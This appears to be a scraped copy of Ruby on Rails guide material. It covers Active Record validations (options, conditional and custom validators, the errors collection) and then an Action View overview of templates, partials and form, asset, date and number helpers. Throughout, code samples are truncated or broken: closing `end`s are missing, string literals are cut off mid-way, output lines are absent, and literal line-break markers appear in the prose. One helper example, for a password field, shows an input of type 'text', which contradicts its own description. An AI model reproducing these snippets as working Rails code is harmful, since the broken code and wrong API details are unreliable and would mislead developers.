The `:allow_blank` option is similar to the `:allow_nil` option. 
This option<n>will let validation pass if the attribute's value is `blank?`, like `nil` or an<n>empty string for example.
class Topic < ActiveRecord::Base
  validates :title, length: { is: 5 }, allow_blank: true
Topic.create(title: "").valid?  
Topic.create(title: nil).valid? 
### `:message`
As you've already seen, the `:message` option lets you specify the message that<n>will be added to the `errors` collection when validation fails. 
When this<n>option is not used, Active Record will use the respective default error message<n>for each validation helper.
### `:on`
The `:on` option lets you specify when the validation should happen. 
The<n>default behavior for all the built-in validation helpers is to be run on save<n>(both when you're creating a new record and when you're updating it). 
If you<n>want to change it, you can use `on: :create` to run the validation only when a<n>new record is created or `on: :update` to run the validation only when a record<n>is updated.
  # it will be possible to update email with a duplicated value
  validates :email, uniqueness: true, on: :create
  # it will be possible to create the record with a non-numerical age
  validates :age, numericality: true, on: :update
  # the default (validates on both create and update)
Strict Validations
You can also specify validations to be strict and raise<n>`ActiveModel::StrictValidationFailed` when the object is invalid.
  validates :name, presence: { strict: true }
Person.new.valid?  
# => ActiveModel::StrictValidationFailed: Name can't be blank
There is also an ability to pass custom exception to `:strict` option.
  validates :token, presence: true, uniqueness: true, strict: TokenGenerationException
# => TokenGenerationException: Token can't be blank
Conditional Validation
Sometimes it will make sense to validate an object only when a given predicate<n>is satisfied. 
You can do that by using the `:if` and `:unless` options, which<n>can take a symbol, a string, a `Proc` or an `Array`. 
You may use the `:if`<n>option when you want to specify when the validation **should** happen. 
If you<n>want to specify when the validation **should not** happen, then you may use the<n>`:unless` option.
### Using a Symbol with `:if` and `:unless`
You can associate the `:if` and `:unless` options with a symbol corresponding<n>to the name of a method that will get called right before validation happens.
This is the most commonly used option.
  validates :card_number, presence: true, if: :paid_with_card?
  def paid_with_card?
    payment_type == "card"
### Using a String with `:if` and `:unless`
You can also use a string that will be evaluated using `eval` and needs to<n>contain valid Ruby code. 
You should use this option only when the string<n>represents a really short condition.
  validates :surname, presence: true, if: "name.nil?"
### Using a Proc with `:if` and `:unless`
Finally, it's possible to associate `:if` and `:unless` with a `Proc` object<n>which will be called. 
Using a `Proc` object gives you the ability to write an<n>inline condition instead of a separate method. 
This option is best suited for<n>one-liners.
  validates :password, confirmation: true,
    unless: Proc.new { |a| a.password.blank? 
### Grouping Conditional validations
Sometimes it is useful to have multiple validations use one condition, it can<n>be easily achieved using `with_options`.
  with_options if: :is_admin? 
do |admin|
    admin.validates :password, length: { minimum: 10 }
    admin.validates :email, presence: true
All validations inside of `with_options` block will have automatically passed<n>the condition `if: :is_admin?`
### Combining Validation Conditions
On the other hand, when multiple conditions define whether or not a validation<n>should happen, an `Array` can be used. 
Moreover, you can apply both `:if` and<n>`:unless` to the same validation.
class Computer < ActiveRecord::Base
  validates :mouse, presence: true,
                    if: ["market.retail?", :desktop?]
                    unless: Proc.new { |c| c.trackpad.present? 
The validation only runs when all the `:if` conditions and none of the<n>`:unless` conditions are evaluated to `true`.
Performing Custom Validations
When the built-in validation helpers are not enough for your needs, you can<n>write your own validators or validation methods as you prefer.
### Custom Validators
Custom validators are classes that extend `ActiveModel::Validator`. 
These<n>classes must implement a `validate` method which takes a record as an argument<n>and performs the validation on it. 
The custom validator is called using the<n>`validates_with` method.
class MyValidator < ActiveModel::Validator
    unless record.name.starts_with? 
      record.errors[:name] << 'Need a name starting with X please!'
class Person
  include ActiveModel::Validations
  validates_with MyValidator
The easiest way to add custom validators for validating individual attributes<n>is with the convenient `ActiveModel::EachValidator`. 
class EmailValidator < ActiveModel::EachValidator
  def validate_each(record, attribute, value)
    unless value =~ /\A([^@\s]+)@((?:[-a-z0-9]+\.)+[a-z]{2,})\z/i
      record.errors[attribute] << (options[:message] || "is not an email")
  validates :email, presence: true, email: true
As shown in the example, you can also combine standard validations with your<n>own custom validators.
### Custom Methods
You can also create methods that verify the state of your models and add<n>messages to the `errors` collection when they are invalid. 
You can pass more than one symbol for each class method and the respective<n>validations will be run in the same order as they were registered.
class Invoice < ActiveRecord::Base
  validate :expiration_date_cannot_be_in_the_past,
    :discount_cannot_be_greater_than_total_value
  def expiration_date_cannot_be_in_the_past
    if expiration_date.present? 
&& expiration_date < Date.today
      errors.add(:expiration_date, "can't be in the past")
  def discount_cannot_be_greater_than_total_value
    if discount > total_value
      errors.add(:discount, "can't be greater than total value")
By default such validations will run every time you call `valid?`. 
It is also<n>possible to control when to run these custom validations by giving an `:on`<n>option to the `validate` method, with either: `:create` or `:update`.
  validate :active_customer, on: :create
  def active_customer
    errors.add(:customer_id, "is not active") unless customer.active?
Working with Validation Errors
In addition to the `valid?` and `invalid?` methods covered earlier, Rails provides a number of methods for working with the `errors` collection and inquiring about the validity of objects.
The following is a list of the most commonly used methods. 
Please refer to the `ActiveModel::Errors` documentation for a list of all the available methods.
### `errors`
Returns an instance of the class `ActiveModel::Errors` containing all errors. 
Each key is the attribute name and the value is an array of strings with all errors.
  validates :name, presence: true, length: { minimum: 3 }
person = Person.new
person.valid? 
person.errors.messages
person = Person.new(name: "John Doe")
person.errors.messages # => {}
`errors[]` is used when you want to check the error messages for a specific attribute. 
It returns an array of strings with all error messages for the given attribute, each string with one error message. 
If there are no errors related to the attribute, it returns an empty array.
person.errors[:name] # => []
person = Person.new(name: "JD")
person.errors[:name]
### `errors.add`
The `add` method lets you manually add messages that are related to particular attributes. 
You can use the `errors.full_messages` or `errors.to_a` methods to view the messages in the form they might be displayed to a user. 
Those particular messages get the attribute name prepended (and capitalized). `add` receives the name of the attribute you want to add the message to, and the message itself.
  def a_method_used_for_validation_purposes
    errors.add(:name, "cannot contain the characters !
person = Person.create(name: "!
 # => ["cannot contain the characters !
person.errors.full_messages
Another way to do this is using `[]=` setter
    def a_method_used_for_validation_purposes
      errors[:name] = "cannot contain the characters !
  person = Person.create(name: "!
  person.errors[:name]
   # => ["cannot contain the characters !
  person.errors.to_a
   # => ["Name cannot contain the characters !
### `errors[:base]`
You can add error messages that are related to the object's state as a whole, instead of being related to a specific attribute. 
You can use this method when you want to say that the object is invalid, no matter the values of its attributes. 
Since `errors[:base]` is an array, you can simply add a string to it and it will be used as an error message.
    errors[:base] << "This person is invalid because ..."
### `errors.clear`
The `clear` method is used when you intentionally want to clear all the messages in the `errors` collection. 
Of course, calling `errors.clear` upon an invalid object won't actually make it valid: the `errors` collection will now be empty, but the next time you call `valid?` or any method that tries to save this object to the database, the validations will run again. 
If any of the validations fail, the `errors` collection will be filled again.
person.errors.clear
person.errors.empty? 
p.save # => false
p.errors[:name]
### `errors.size`
The `size` method returns the total number of error messages for the object.
person.errors.size # => 2
person = Person.new(name: "Andrea", email: "andrea@example.com")
person.errors.size # => 0
Displaying Validation Errors in Views
Once you've created a model and added validations, if that model is created via<n>a web form, you probably want to display an error message when one of the<n>validations fail.
Because every application handles this kind of thing differently, Rails does<n>not include any view helpers to help you generate these messages directly.
However, due to the rich number of methods Rails gives you to interact with<n>validations in general, it's fairly easy to build your own. 
In addition, when<n>generating a scaffold, Rails will put some ERB into the `_form.html.erb` that<n>it generates that displays the full list of errors on that model.
  <div id="error_explanation">
    <ul>
      <li><%= msg %></li>
    <% end %>
    </ul>
  </div>
Furthermore, if you use the Rails form helpers to generate your forms, when<n>a validation error occurs on a field, it will generate an extra `<div>` around<n>the entry.
<div class="field_with_errors">
</div>
You can then style this div however you'd like. 
The default scaffold that<n>Rails generates, for example, adds this CSS rule:
.field_with_errors {
  padding: 2px;
  background-color: red;
  display: table;
This means that any field with an error ends up with a 2 pixel red border.
Action View Overview
* What Action View is and how to use it with Rails.
* How best to use templates, partials, and layouts.
* What helpers are provided by Action View and how to make your own.
* How to use localized views.
What is Action View?
Action View and Action Controller are the two major components of Action Pack. 
In Rails, web requests are handled by Action Pack, which splits the work into a controller part (performing the logic) and a view part (rendering a template). 
Typically, Action Controller will be concerned with communicating with the database and performing CRUD actions where necessary. 
Action View is then responsible for compiling the response.
Action View templates are written using embedded Ruby in tags mingled with HTML. 
To avoid cluttering the templates with boilerplate code, a number of helper classes provide common behavior for forms, dates, and strings. 
It's also easy to add new helpers to your application as it evolves.
NOTE: Some features of Action View are tied to Active Record, but that doesn't mean Action View depends on Active Record. 
Action View is an independent package that can be used with any sort of Ruby libraries.
Using Action View with Rails
For each controller there is an associated directory in the `app/views` directory which holds the template files that make up the views associated with that controller. 
These files are used to display the view that results from each controller action.
Let's take a look at what Rails does by default when creating a new resource using the scaffold generator:
      [...]
      invoke  scaffold_controller
      create
    app
      invoke    erb
      app
There is a naming convention for views in Rails. 
Typically, the views share their name with the associated controller action, as you can see above.
The complete HTML returned to the client is composed of a combination of this ERB file, a layout template that wraps it, and all the partials that the view may reference. 
Templates, Partials and Layouts
### Templates
Action View templates can be written in several ways. 
Rails supports multiple template systems and uses a file extension to distinguish amongst them. 
For example, an HTML file using the ERB template system will have `.html.erb` as a file extension.
#### ERB
Within an ERB template, Ruby code can be included using both `<% %>` and `<%= %>` tags. 
The `<% %>` tags are used to execute Ruby code that does not return anything, such as conditions, loops or blocks, and the `<%= %>` tags are used when you want output.
Consider the following loop for names:
```html+erb
<h1>Names of all the people</h1>
<% @people.each do |person| %>
  Name: <%= person.name %><br>
So this would be wrong:
<%# WRONG %>
Hi, Mr. <% puts "Frodo" %>
To suppress leading and trailing whitespaces, you can use `<%-` `-%>` interchangeably with `<%` and `%>`.
#### Builder
Builder templates are a more programmatic alternative to ERB. 
They are especially useful for generating XML content. 
An XmlMarkup object named `xml` is automatically made available to templates with a `.builder` extension.
Here are some basic examples:
xml.em("emphasized")
xml.em { xml.b("emph & bold") }
xml.a("A Link", "href" => "http://rubyonrails.org")
xml.target("name" => "compile", "option" => "fast")
which would produce:
<em>emphasized</em>
<em><b>emph &amp; bold</b></em>
<a href="http://rubyonrails.org">A link</a>
<target option="fast" name="compile" />
Any method with a block will be treated as an XML markup tag with nested markup in the block. 
For example, the following:
xml.div {
  xml.h1(@person.name)
  xml.p(@person.bio)
would produce something like:
<div>
  <h1>David Heinemeier Hansson</h1>
  <p>A product of Danish Design during the Winter of '79...</p>
Below is a full-length RSS example actually used on Basecamp:
xml.rss("version" => "2.0", "xmlns:dc" => "http://purl.org/dc/elements/1.1/") do
  xml.channel do
    xml.title(@feed_title)
    xml.link(@url)
    xml.description "Basecamp: Recent items"
    xml.language "en-us"
    xml.ttl "40"
    for item in @recent_items
      xml.item do
        xml.title(item_title(item))
        xml.description(item_description(item)) if item_description(item)
        xml.pubDate(item_pubDate(item))
        xml.guid(@person.firm.account.url + @recent_items.url(item))
        xml.link(@person.firm.account.url + @recent_items.url(item))
        xml.tag!("
dc:creator", item.author_name) if item_has_creator?(
#### Template Caching
By default, Rails will compile each template to a method in order to render it. 
When you alter a template, Rails will check the file's modification time and recompile it in development mode.
### Partials
Partial templates - usually just called "partials" - are another device for breaking the rendering process into more manageable chunks. 
With partials, you can extract pieces of code from your templates to separate files and also reuse them throughout your templates.
#### Naming Partials
<%= render "menu" %>
This will render a file named `_menu.html.erb` at that point within the view that is being rendered. 
Note the leading underscore character: partials are named with a leading underscore to distinguish them from regular views, even though they are referred to without the underscore. 
This holds true even when you're pulling in a partial from another folder:
<%= render "shared/menu" %>
That code will pull in the partial from `app/views/shared/_menu.html.erb`.
#### Using Partials to simplify Views
One way to use partials is to treat them as the equivalent of subroutines; a way to move details out of a view so that you can grasp what's going on more easily. 
For example, you might have a view that looks like this:
<%= render "shared/ad_banner" %>
<h1>Products</h1>
<p>Here are a few of our fine products:</p>
<%= render "shared/footer" %>
Here, the `_ad_banner.html.erb` and `_footer.html.erb` partials could contain content that is shared among many pages in your application. 
You don't need to see the details of these sections when you're concentrating on a particular page.
#### The `as` and `object` options
By default `ActionView::Partials::PartialRenderer` has its object in a local variable with the same name as the template. 
So, given:
<%= render partial: "product" %>
within product we'll get `@product` in the local variable `product`, as if we had written:
With the `as` option we can specify a different name for the local variable. 
For example, if we wanted it to be `item` instead of `product` we would do:
The `object` option can be used to directly specify which object is rendered into the partial; useful when the template's object is elsewhere (eg. in a different instance variable or in a local variable).
For example, instead of:
we would do:
<%= render partial: "product", object: @item %>
The `object` and `as` options can also be used together:
#### Rendering Collections
So this example for rendering all the products:
can be rewritten in a single line:
You can use a shorthand syntax for rendering collections. 
Assuming `@products` is a collection of `Product` instances, you can simply write the following to produce the same result:
<%= render @products %>
Rails determines the name of the partial to use by looking at the model name in the collection, `Product` in this case. 
#### Spacer Templates
You can also specify a second partial to be rendered between instances of the main partial by using the `:spacer_template` option:
<%= render partial: @products, spacer_template: "product_ruler" %>
### Layouts
Layouts can be used to render a common view template around the results of Rails controller actions. 
The logged in user layout might include top-level navigation that should be present across many controller actions. 
You would expect each layout to have a different look and feel. 
Layouts and Rendering in Rails
Partial Layouts
Partials can have their own layouts applied to them. 
  <%= yield %>
  <p>
this would output the following:
    <p>
However, unlike application-wide layouts, partial layouts still have the underscore prefix.
You can also render a block of code within a partial layout instead of calling `yield`. 
  <% end %>
Supposing we use the same `_box` partial from above, this would produce the same output as the previous example.
View Paths
TODO...
Overview of helpers provided by Action View
-------------------------------------------
WIP: Not all the helpers are listed here. 
For a full list see the [API documentation](http://api.rubyonrails.org/classes/ActionView/Helpers.html)
The following is only a brief overview summary of the helpers available in Action View. 
It's recommended that you review the [API Documentation](http://api.rubyonrails.org/classes/ActionView/Helpers.html), which covers all of the helpers in more detail, but this should serve as a good starting point.
### RecordTagHelper
This module provides methods for generating container tags, such as `div`, for your record. 
This is the recommended way of creating a container for render your Active Record object, as it adds an appropriate class and id attributes to that container. 
You can then refer to those containers easily by following the convention, instead of having to think about which class or id attribute you should use.
#### content_tag_for
Renders a container tag that relates to your Active Record Object.
For example, given
This will generate this HTML output:
  <td>Hello World!
</tr>
You can also supply HTML attributes as an additional option hash. 
Will generate this HTML output:
You can pass a collection of Active Record objects. 
  <td>Ruby on Rails Rocks!
#### div_for
This is actually a convenient method which calls `content_tag_for` internally with `:div` as the tag name. 
You can pass either an Active Record object or a collection of objects. 
### AssetTagHelper
This module provides methods for generating HTML that links views to assets such as images, JavaScript files, stylesheets, and feeds.
By default, Rails links to these assets on the current host in the public folder, but you can direct Rails to link to assets from a dedicated assets server by setting `config.action_controller.asset_host` in the application configuration, typically in `config/environments/production.rb`. 
For example, let's say your asset host is `assets.example.com`:
config.action_controller.asset_host = "assets.example.com"
image_tag("rails.png") # => <img src="http://assets.example.com/images/rails.png" alt="Rails" />
#### auto_discovery_link_tag
Returns a link tag that browsers and feed readers can use to auto-detect an RSS or Atom feed.
#### image_path
Computes the path to an image asset in the `app/assets/images` directory. 
Full paths from the document root will be passed through. 
Used internally by `image_tag` to build the image path.
image_path("edit.png") # => /assets/edit.png
Fingerprint will be added to the filename if config.assets.digest is set to true.
image_path("edit.png") # => /assets/edit-2d1a2db63fc738690021fedb5a65b68e.png
#### image_url
Computes the url to an image asset in the `app/assets/images` directory. 
This will call `image_path` internally and merge with your current host or your asset host.
image_url("edit.png") # => http://www.example.com/assets/edit.png
#### image_tag
The source can be a full path or a file that exists in your `app/assets/images` directory.
image_tag("icon.png") # => <img src="/assets/icon.png" alt="Icon" />
#### javascript_include_tag
You can pass in the filename (`.js` extension is optional) of JavaScript files that exist in your `app/assets/javascripts` directory for inclusion into the current page or you can pass the full path relative to your document root.
javascript_include_tag "common" # => <script src="/assets/common.js"></script>
If the application does not use the asset pipeline, to include the jQuery JavaScript library in your application, pass `:defaults` as the source. 
When using `:defaults`, if an `application.js` file exists in your `app/assets/javascripts` directory, it will be included as well.
javascript_include_tag :defaults
You can also include all JavaScript files in the `app/assets/javascripts` directory using `:all` as the source.
javascript_include_tag :all
You can also cache multiple JavaScript files into one file, which requires less HTTP connections to download and can better be compressed by gzip (leading to faster transfers). 
Caching will only happen if `ActionController::Base.perform_caching` is set to true (which is the case by default for the Rails production environment, but not for the development environment).
javascript_include_tag :all, cache: true # =>
  <script src="/javascripts/all.js"></script>
#### javascript_path
Computes the path to a JavaScript asset in the `app/assets/javascripts` directory. 
If the source filename has no extension, `.js` will be appended. 
Used internally by `javascript_include_tag` to build the script path.
javascript_path "common" # => /assets/common.js
#### javascript_url
Computes the url to a JavaScript asset in the `app/assets/javascripts` directory. 
This will call `javascript_path` internally and merge with your current host or your asset host.
javascript_url "common" # => http://www.example.com/assets/common.js
#### stylesheet_link_tag
Returns a stylesheet link tag for the sources specified as arguments. 
If you don't specify an extension, `.css` will be appended automatically.
stylesheet_link_tag "application" # => <link href="/assets/application.css" media="screen" rel="stylesheet" />
You can also include all styles in the stylesheet directory using :all as the source:
stylesheet_link_tag :all
You can also cache multiple stylesheets into one file, which requires less HTTP connections and can better be compressed by gzip (leading to faster transfers). 
Caching will only happen if ActionController::Base.perform_caching is set to true (which is the case by default for the Rails production environment, but not for the development environment).
stylesheet_link_tag :all, cache: true
# => <link href="/assets/all.css" media="screen" rel="stylesheet" />
#### stylesheet_path
Computes the path to a stylesheet asset in the `app/assets/stylesheets` directory. 
If the source filename has no extension, .css will be appended. 
Used internally by stylesheet_link_tag to build the stylesheet path.
stylesheet_path "application" # => /assets/application.css
#### stylesheet_url
Computes the url to a stylesheet asset in the `app/assets/stylesheets` directory. 
This will call `stylesheet_path` internally and merge with your current host or your asset host.
stylesheet_url "application" # => http://www.example.com/assets/application.css
### AtomFeedHelper
#### atom_feed
This helper makes building an Atom feed easy. 
Here's a full usage example:
**config/routes.rb**
def index
  respond_to do |format|
    format.html
    format.atom
atom_feed do |feed|
      entry.author do |author|
### BenchmarkHelper
#### benchmark
Allows you to measure the execution time of a block in a template and records the result to the log. 
Wrap this block around expensive operations or possible bottlenecks to get a time reading for the operation.
<% benchmark "Process data files" do %>
  <%= expensive_files_operation %>
This would add something like "Process data files (0.34523)" to the log, which you can then use to compare timings when optimizing your code.
### CacheHelper
#### cache
A method for caching fragments of a view rather than an entire action or page. 
This technique is useful caching pieces like menus, lists of news topics, static HTML fragments, and so on. 
This method takes a block that contains the content you wish to cache. 
See `ActionController::Caching::Fragments` for more information.
<% cache do %>
  <%= render "shared/footer" %>
### CaptureHelper
#### capture
The `capture` method allows you to extract part of a template into a variable. 
You can then use this variable anywhere in your templates or layout.
<% @greeting = capture do %>
  <p>Welcome! 
The date and time is <%= Time.now %></p>
The captured variable can then be used anywhere else.
<html>
  <head>
    <title>Welcome!
  </head>
  <body>
    <%= @greeting %>
  </body>
</html>
#### content_for
Calling `content_for` stores a block of markup in an identifier for later use. 
You can make subsequent calls to the stored content in other templates or the layout by passing the identifier as an argument to `yield`.
For example, let's say we have a standard application layout, but also a special page that requires certain JavaScript that the rest of the site doesn't need. 
We can use `content_for` to include this JavaScript on our special page without fattening up the rest of the site.
**app/views/layouts/application.html.erb**
    <%= yield :special_script %>
    <p>Welcome! 
<p>This is a special page.</p>
<% content_for :special_script do %>
  <script>alert('Hello!')
### DateHelper
#### date_select
Returns a set of select tags (one for year, month, and day) pre-selected for accessing a specified date-based attribute.
#### datetime_select
Returns a set of select tags (one for year, month, day, hour, and minute) pre-selected for accessing a specified datetime-based attribute.
#### distance_of_time_in_words
Reports the approximate distance in time between two Time or Date objects or integers as seconds. 
Set `include_seconds` to true if you want more detailed approximations.
distance_of_time_in_words(Time.now, Time.now + 15.seconds, include_seconds: true)  # => less than 20 seconds
#### select_date
# Generates a date select that defaults to the date provided (six days after today)
select_date(Time.today + 6.days)
# Generates a date select that defaults to today (no specified date)
select_date()
#### select_datetime
# Generates a datetime select that defaults to the datetime provided (four days after today)
select_datetime(Time.now + 4.days)
# Generates a datetime select that defaults to today (no specified datetime)
select_datetime()
#### select
Returns a select tag with options for each of the days 1 through 31 with the current day selected.
# Generates a select field for days that defaults to the day for the date provided
# Generates a select field for days that defaults to the number given
Returns a select tag with options for each of the hours 0 through 23 with the current hour selected.
# Generates a select field for minutes that defaults to the minutes for the time provided.
Returns a select tag with options for each of the months January through December with the current month selected.
# Generates a select field for months that defaults to the current month
Returns a select tag with options for each of the seconds 0 through 59 with the current second selected.
# Generates a time select that defaults to the time provided
The five year radius can be changed using the `:start_year` and `:end_year` keys in the `options`.
# Generates a select field for five years on either side of Date.today that defaults to the current year
# Generates a select field from 1900 to 2009 that defaults to the current year
Like `distance_of_time_in_words`, but where `to_time` is fixed to `Time.now`.
Returns a set of select tags (one for hour, minute and optionally second) pre-selected for accessing a specified time-based attribute. 
The selects are prepared for multi-parameter assignment to an Active Record object.
# Creates a time select tag that, when POSTed, will be stored in the order variable in the submitted attribute
Returns a `pre` tag that has object dumped by YAML. This creates a very readable way to inspect an object.
my_hash = {'first' => 1, 'second' => 'two', 'third' => [1,2,3]}
debug(my_hash)
<pre class='debug_dump'>---
first: 1
second: two
third:
</pre>
### FormHelper
Form helpers are designed to make working with models much easier compared to using just standard HTML elements by providing a set of methods for creating forms based on your models. 
This helper generates the HTML for forms, providing a method for each sort of input (e.g., text, password, select, and so on). 
When the form is submitted (i.e., when the user hits the submit button or form.submit is called via JavaScript), the form inputs will be bundled into the params object and passed back to the controller.
There are two types of form helpers: those that specifically work with model attributes and those that don't. 
This helper deals with those that work with model attributes; to see an example of form helpers that don't work with model attributes, check the ActionView::Helpers::FormTagHelper documentation.
The core method of this helper, form_for, gives you the ability to create a form for a model instance; for example, let's say that you have a model Person and want to create a new instance of it:
# Note: a @person variable will have been created in the controller (e.g. @person = Person.new)
<%= form_for @person, url: {action: "create"} do |f| %>
  <%= f.text_field :first_name %>
  <%= f.text_field :last_name %>
  <%= submit_tag 'Create' %>
The HTML generated for this would be:
<form action="/people/create" method="post">
  <input id="person_first_name" name="person[first_name]" type="text" />
  <input id="person_last_name" name="person[last_name]" type="text" />
  <input name="commit" type="submit" value="Create" />
The params object created when this form is submitted would look like:
{"action" => "create", "controller" => "people", "person" => {"first_name" => "William", "last_name" => "Smith"}}
The params hash has a nested person value, which can therefore be accessed with params[:person] in the controller.
#### check_box
Returns a checkbox tag tailored for accessing a specified attribute.
#### fields_for
Creates a scope around a specific model object like form_for, but doesn't create the form tags themselves. 
This makes fields_for suitable for specifying additional model objects in the same form:
<%= form_for @person, url: {action: "update"} do |person_form| %>
  First name: <%= person_form.text_field :first_name %>
  Last name : <%= person_form.text_field :last_name %>
  <%= fields_for @person.permission do |permission_fields| %>
    Admin?  : <%= permission_fields.check_box :admin %>
#### file_field
Returns a file upload input tag tailored for accessing a specified attribute.
file_field(:user, :avatar)
# => <input type="file" id="user_avatar" name="user[avatar]" />
#### form_for
Creates a form and a scope around a specific model object that is used as a base for questioning about values for the fields.
  <%= f.label :title, 'Title' %>:
  <%= f.text_field :title %><br>
  <%= f.label :body, 'Body' %>:
  <%= f.text_area :body %><br>
#### hidden_field
Returns a hidden input tag tailored for accessing a specified attribute.
hidden_field(:user, :token)
# => <input type="hidden" id="user_token" name="user[token]" value="#{@user.token}" />
#### label
Returns a label tag tailored for labelling an input field for a specified attribute.
#### password_field
Returns an input tag of the "password" type tailored for accessing a specified attribute.
password_field(:login, :pass)
# => <input type="text" id="login_pass" name="login[pass]" value="#{@login.pass}" />
#### radio_button
Returns a radio button tag for accessing a specified attribute.
#### text_area
Returns a textarea opening and closing tag set tailored for accessing a specified attribute.
text_area(:comment, :text, size: "20x30")
# => <textarea cols="20" rows="30" id="comment_text" name="comment[text]">
#      #{@comment.text}
#    </textarea>
#### text_field
Returns an input tag of the "text" type tailored for accessing a specified attribute.
#### email_field
Returns an input tag of the "email" type tailored for accessing a specified attribute.
email_field(:user, :email)
# => <input type="email" id="user_email" name="user[email]" value="#{@user.email}" />
#### url_field
Returns an input tag of the "url" type tailored for accessing a specified attribute.
url_field(:user, :url)
# => <input type="url" id="user_url" name="user[url]" value="#{@user.url}" />
### FormOptionsHelper
Provides a number of methods for turning different kinds of containers into a set of option tags.
#### collection_select
Returns `select` and `option` tags for the collection of existing return values of `method` for `object`'s class.
Example object structure for use with this method:
class A
  belongs_to :author
class Author < ActiveRecord::Base
  def name_with_initial
    "#{first_name.first}. #{last_name}"
  <option value="">Please select</option>
  <option value="1" selected="selected">D. Heinemeier Hansson</option>
  <option value="2">D. Thomas</option>
  <option value="3">M. Clark</option>
</select>
#### collection_radio_buttons
Returns `radio_button` tags for the collection of existing return values of `method` for `object`'s class.
#### collection_check_boxes
Returns `check_box` tags for the collection of existing return values of `method` for `object`'s class.
  has_and_belongs_to_many :authors
#### option_groups_from_collection_for_select
Returns a string of `option` tags, like `options_from_collection_for_select`, but groups them by `optgroup` tags based on the object relationships of the arguments.
class Continent < ActiveRecord::Base
  has_many :countries
  # attribs: id, name
class Country < ActiveRecord::Base
  belongs_to :continent
  # attribs: id, name, continent_id
Sample usage:
option_groups_from_collection_for_select(@continents, :countries, :name, :id, :name, 3)
Possible output:
<optgroup label="Africa">
  <option value="1">Egypt</option>
  <option value="4">Rwanda</option>
</optgroup>
<optgroup label="Asia">
  <option value="3" selected="selected">China</option>
  <option value="12">India</option>
  <option value="5">Japan</option>
Note: Only the `optgroup` and `option` tags are returned, so you still have to wrap the output in an appropriate `select` tag.
#### options_for_select
Accepts a container (hash, array, enumerable, your type) and returns a string of option tags.
options_for_select([ "VISA", "MasterCard" ])
# => <option>VISA</option> <option>MasterCard</option>
Note: Only the `option` tags are returned, you have to wrap this call in a regular HTML `select` tag.
#### options_from_collection_for_select
Returns a string of option tags that have been compiled by iterating over the `collection` and assigning the result of a call to the `value_method` as the option value and the `text_method` as the option text.
# options_from_collection_for_select(collection, value_method, text_method, selected = nil)
For example, imagine a loop iterating over each person in @project.people to generate an input tag:
options_from_collection_for_select(@project.people, "id", "name")
# => <option value="#{person.id}">#{person.name}</option>
Create a select tag and a series of contained option tags for the provided object and method.
  <option value=""></option>
  <option value="1" selected="selected">David</option>
  <option value="2">Sam</option>
  <option value="3">Tobias</option>
#### time_zone_options_for_select
Returns a string of option tags for pretty much any time zone in the world.
#### time_zone_select
Returns select and option tags for the given object and method, using `time_zone_options_for_select` to generate the list of option tags.
time_zone_select( "user", "time_zone")
#### date_field
Returns an input tag of the "date" type tailored for accessing a specified attribute.
date_field("user", "dob")
### FormTagHelper
Provides a number of methods for creating form tags that don't rely on an Active Record object assigned to the template like FormHelper does. 
Instead, you provide the names and values manually.
#### check_box_tag
Creates a check box form input tag.
check_box_tag 'accept'
# => <input id="accept" name="accept" type="checkbox" value="1" />
#### field_set_tag
Creates a field set for grouping HTML form elements.
<%= field_set_tag do %>
  <p><%= text_field_tag 'name' %></p>
# => <fieldset><p><input id="name" name="name" type="text" /></p></fieldset>
#### file_field_tag
Creates a file upload field.
<%= form_tag({action:"post"}, multipart: true) do %>
  <label for="file">File to Upload</label> <%= file_field_tag "file" %>
  <%= submit_tag %>
Example output:
file_field_tag 'attachment'
# => <input id="attachment" name="attachment" type="file" />
#### form_tag
Starts a form tag that points the action to an url configured with `url_for_options` just like `ActionController::Base#url_for`.
  <div><%= submit_tag 'Save' %></div>
#### hidden_field_tag
Creates a hidden form input field used to transmit data that would be lost due to HTTP's statelessness or data that should be hidden from the user.
hidden_field_tag 'token', 'VUBJKB23UIVI1UU1VOBVI@'
# => <input id="token" name="token" type="hidden" value="VUBJKB23UIVI1UU1VOBVI@" />
#### image_submit_tag
Displays an image which when clicked will submit the form.
image_submit_tag("login.png")
# => <input src="/images/login.png" type="image" />
#### label_tag
Creates a label field.
label_tag 'name'
# => <label for="name">Name</label>
#### password_field_tag
Creates a password field, a masked text field that will hide the users input behind a mask character.
password_field_tag 'pass'
# => <input id="pass" name="pass" type="password" />
#### radio_button_tag
Creates a radio button; use groups of radio buttons named the same to allow users to select from a group of options.
radio_button_tag 'gender', 'male'
# => <input id="gender_male" name="gender" type="radio" value="male" />
#### select_tag
Creates a dropdown selection box.
select_tag "people", "<option>David</option>"
# => <select id="people" name="people"><option>David</option></select>
#### submit_tag
Creates a submit button with the text provided as the caption.
#### text_area_tag
Creates a text input area; use a textarea for longer text inputs such as blog posts or descriptions.
#### text_field_tag
Creates a standard text field; use these text fields to input smaller chunks of text like a username or a search query.
text_field_tag 'name'
# => <input id="name" name="name" type="text" />
#### email_field_tag
Creates a standard input field of email type.
email_field_tag 'email'
# => <input id="email" name="email" type="email" />
#### url_field_tag
Creates a standard input field of url type.
url_field_tag 'url'
# => <input id="url" name="url" type="url" />
#### date_field_tag
Creates a standard input field of date type.
date_field_tag "dob"
# => <input id="dob" name="dob" type="date" />
### JavaScriptHelper
Provides functionality for working with JavaScript in your views.
#### escape_javascript
Escape carrier returns and single and double quotes for JavaScript segments.
#### javascript_tag
Returns a JavaScript tag wrapping the provided code.
javascript_tag "alert('All is good')"
<script>
alert('All is good')
//]]>
</script>
### NumberHelper
Provides methods for converting numbers into formatted strings. 
Methods are provided for phone numbers, currency, percentage, precision, positional notation, and file size.
#### number_to_currency
Formats a number into a currency string (e.g., $13.65).
number_to_currency(1234567890.50) # => $1,234,567,890.50
#### number_to_human_size
Formats the bytes in size into a more understandable representation; useful for reporting file sizes to users.
number_to_human_size(1234)          # => 1.2 KB
number_to_human_size(1234567)       # => 1.2 MB
#### number_to_percentage
Formats a number as a percentage string.
number_to_percentage(100, precision: 0)        # => 100%
#### number_to_phone
Formats a number into a US phone number.
number_to_phone(1235551234) # => 123-555-1234
#### number_with_delimiter
Formats a number with grouped thousands using a delimiter.
number_with_delimiter(12345678) # => 12,345,678
#### number_with_precision
Formats a number with the specified level of `precision`, which defaults to 3.
number_with_precision(111.2345)     # => 111.235
number_with_precision(111.2345, 2)  # => 111.23
### SanitizeHelper
The SanitizeHelper module provides a set of methods for scrubbing text of undesired HTML elements.
#### sanitize
sanitize @article.body
If either the :attributes or :tags options are passed, only the mentioned tags and attributes are allowed and nothing else.
sanitize @article.body, tags: %w(table tr td), attributes: %w(id class style)
To change defaults for multiple uses, for example adding table tags to the default:
class Application < Rails::Application
